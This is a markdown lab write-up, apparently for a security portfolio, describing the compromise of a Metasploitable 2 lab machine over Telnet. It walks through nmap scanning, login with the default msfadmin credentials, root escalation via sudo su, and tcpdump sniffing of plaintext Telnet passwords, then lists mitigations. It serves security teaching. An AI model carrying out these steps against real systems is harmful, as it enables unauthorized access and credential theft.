@@ -1,0 +1,185 @@
+✅ Telnet Remote Access & Credential Sniffing
+
+Target: Metasploitable 2
+Service: Telnet (TCP/23)
+Attack Type: Initial Access + Credential Exposure + Privilege Escalation
+Difficulty: Beginner
+Status: Fully Compromised
+
+📌 Overview
+
+This lab demonstrates how an attacker can gain unauthorized access to a system running Telnet, steal clear‑text credentials over the network, and escalate to full system control.
+
+Telnet is an outdated protocol that transmits all data — including usernames and passwords — in plaintext, making it highly vulnerable.
+
+🔎 1. Service Discovery
+
+Initial port scan:
+
+nmap 192.168.56.101
+
+
+Result excerpt:
+
+23/tcp  open  telnet
+
+
+Version detection:
+
+nmap -sV -p 23 192.168.56.101
+
+
+Result:
+
+23/tcp open telnet  Linux telnetd
+
+
+✅ Telnet is active and accepting remote logins.
+
+🏁 2. Manual Access via Telnet
+
+Attempting connection:
+
+telnet 192.168.56.101
+
+
+The service prompts for credentials:
+
+login:
+password:
+
+
+Metasploitable 2 ships with default credentials:
+
+Username: msfadmin
+Password: msfadmin
+
+
+After logging in:
+
+whoami
+
+
+Output:
+
+msfadmin
+
+
+✅ We now have a remote shell as a valid system user.
+
+🚨 Vulnerability Exploited
+
+Protocol transmits all data in plaintext
+
+Weak default credentials
+
+No access restrictions
+
+No encryption or authentication hardening
+
+This represents a real‑world misconfiguration often found in legacy environments.
+
+🎯 3. Privilege Escalation
+
+Check sudo permissions:
+
+sudo -l
+
+
+Typical output on Metasploitable 2:
+
+(ALL) ALL
+
+
+Escalate:
+
+sudo su
+
+
+Enter password: msfadmin
+
+Verify:
+
+whoami
+
+root
+
+
+✅ Full system compromise.
+
+🕵️ 4. Credential Sniffing (No Login Required)
+
+An attacker on the same network can steal Telnet credentials without interacting with the victim, using passive network sniffing.
+
+Start capture on the attacker machine (Kali):
+
+sudo tcpdump -i eth0 -A port 23
+
+
+Then perform a Telnet login from another terminal/machine.
+
+Captured output will reveal:
+
+login: msfadmin
+password: msfadmin
+
+
+✅ This proves that Telnet exposes credentials in clear text.
+
+Why this matters:
+
+No exploits required
+
+No authentication required
+
+Stealthy attack
+
+Enables further system compromise
+
+💥 Impact
+Category	Risk
+Confidentiality	Credentials exposed
+Integrity	Attacker can modify system files
+Availability	Full root access enables disruption
+Lateral Movement	Credentials may work across other services
+Persistence	Backdoors can be created
+
+Final Result: The attacker gains complete control of the system.
+
+🔧 5. Mitigation
+
+✅ Disable Telnet entirely
+✅ Replace with SSH
+✅ Remove default credentials
+✅ Enforce strong passwords & MFA
+✅ Restrict remote access via firewall
+✅ Implement network segmentation
+✅ Monitor logs & detect suspicious logins
+
+In modern environments, Telnet should never be exposed or used.
+
+📚 Key Takeaways
+
+Misconfigurations are often more dangerous than exploits
+
+Plaintext protocols are a critical security risk
+
+Attackers can compromise a system without touching passwords directly
+
+Privilege escalation turns "access" into "ownership"
+
+✅ Skills Demonstrated
+
+Network enumeration
+
+Service assessment
+
+Manual exploitation
+
+Credential sniffing
+
+Privilege escalation
+
+Impact assessment
+
+Mitigation planning
